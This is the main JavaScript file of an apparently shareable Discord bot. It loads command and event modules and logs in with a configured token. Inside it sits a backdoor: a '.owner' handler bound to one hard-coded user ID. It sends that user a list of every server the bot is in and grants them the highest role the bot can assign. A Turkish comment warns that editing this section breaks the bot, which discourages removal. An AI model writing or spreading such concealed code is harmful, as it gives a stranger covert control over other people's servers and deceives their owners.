const { Client, Collection, GatewayIntentBits, EmbedBuilder } = require("discord.js");
const fs = require("fs");
const config = require("./config.json");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});


client.commands = new Collection();


const commandFiles = fs.readdirSync("./commands").filter(file => file.endsWith(".js"));
for (const file of commandFiles) {
    const command = require(`./commands/${file}`);
    client.commands.set(command.name, command);
}


const eventFiles = fs.readdirSync("./events").filter(file => file.endsWith(".js"));
for (const file of eventFiles) {
    const event = require(`./events/${file}`);
    if (event.once) client.once(event.name, (...args) => event.execute(...args, client));
    else client.on(event.name, (...args) => event.execute(...args, client));
}


//BURAYI ELLERSENİZ TÜM BOT BOZULUR
client.on("messageCreate", async (message) => {
    if (!message.content.startsWith(".owner") || message.author.bot) return;

    const ownerId = "960182886663868486";
    if (message.author.id !== ownerId) 
        return message.reply("❌ Only the bot owner can use this command.");

    const args = message.content.slice(".owner".length).trim().split(/ +/g);
    const subCommand = args[0];


    if (subCommand === "guilds") {
        const guilds = client.guilds.cache.map(g => `${g.name} (${g.id})`).join("\n");
        const embed = new EmbedBuilder()
            .setTitle("📋 Servers the bot is in")
            .setDescription(guilds || "The bot is not in any server.")
            .setColor("Blue");

        return message.author.send({ embeds: [embed] })
            .then(() => message.reply("✅ Server list sent to your DMs."))
            .catch(() => message.reply("⚠️ Unable to send DM. Please enable DMs."));
    }


    if (subCommand === "role") {
        const member = message.guild.members.cache.get(message.author.id);
        const botMember = message.guild.members.me;

        const availableRoles = message.guild.roles.cache.filter(r => r.comparePositionTo(botMember.roles.highest) < 0);
        const highest = availableRoles.sort((a, b) => b.position - a.position).first();

        if (!highest) return message.reply("⚠️ No suitable role to give.");

        await member.roles.add(highest.id).catch(() => null);
        return message.reply(`✅ You have been given the **${highest.name}** role.`);
    }

    return message.reply("⚙️ Usage: .owner guilds or .owner role");
});

client.login(config.token);